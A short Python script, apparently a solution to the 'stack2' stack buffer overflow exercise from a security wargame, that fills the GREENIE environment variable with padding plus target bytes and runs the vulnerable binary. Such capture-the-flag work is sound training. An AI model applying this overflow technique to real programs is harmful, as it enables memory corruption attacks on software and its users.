import os
import binascii

ans="A"*64
encoded=(binascii.unhexlify("0d0a0d0a")[::-1]).decode()
# print (encoded)
ans+=encoded
os.environ["GREENIE"]=ans
os.system("./stack2")
